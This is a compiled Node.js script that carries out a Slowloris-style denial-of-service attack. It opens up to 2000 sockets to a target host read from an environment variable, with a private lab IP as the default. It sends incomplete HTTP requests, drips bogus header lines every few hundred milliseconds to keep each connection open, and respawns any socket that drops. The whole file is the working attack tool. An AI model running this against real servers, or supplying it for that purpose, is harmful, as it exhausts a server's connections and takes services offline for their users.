"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const net_1 = __importDefault(require("net"));
let activeSockets = 0;
const opts = {
    port: 80,
    host: process.env.TARGET_HOST || "192.168.99.100",
    method: 'GET',
    path: '/',
    respawn: true,
    sockets: parseInt(process.env.SOCKETS_NR || "2000"),
};
console.log('Starting sockets...');
const addSocket = () => {
    let socket = new net_1.default.Socket();
    socket.connect(opts.port || 80, opts.host);
    let writeKeepAlive;
    socket.on('connect', () => {
        const helloMsg = (opts.method || 'GET') + ' ' + (opts.path || '/') + ' HTTP/1.1\n';
        console.log('Write ', helloMsg);
        socket.write(helloMsg, 'ascii', () => {
            console.log('Socket activated. (Total active: ' + activeSockets + ')');
            activeSockets++;
            const hostMsg = `Host: ${opts.host}:${opts.port}\n`;
            socket.write(hostMsg);
            console.log('Write ', hostMsg);
            const keepAlive = `Connection: keep-alive`;
            socket.write(keepAlive);
            let sentPacketCount = 0;
            let multiplier = Math.floor(Math.random() * 100);
            writeKeepAlive = () => {
                sentPacketCount++;
                socket.write('sloww' + (sentPacketCount * multiplier) + ': ' + 'slowpacket' + (sentPacketCount * multiplier + 2) + '\n', () => {
                    setTimeout(() => writeKeepAlive !== undefined ? writeKeepAlive() : null, (opts.rate || Math.floor(Math.random() * 100) + 600));
                });
            };
            writeKeepAlive();
        });
        socket.on('error', (err) => {
            console.log('Socket errorred. ', err.message);
            socket.destroy();
        });
        socket.on('data', (data) => {
            console.log(data.toString());
        });
        socket.on('close', () => {
            activeSockets--;
            writeKeepAlive = undefined;
            if (opts.hasOwnProperty('respawn') ? opts.respawn : true) {
                console.log('Respawning dead socket...');
                addSocket();
            }
        });
    });
};
for (let i = 0; i <= (opts.sockets || 200); i++) {
    addSocket();
}
//# sourceMappingURL=index.js.map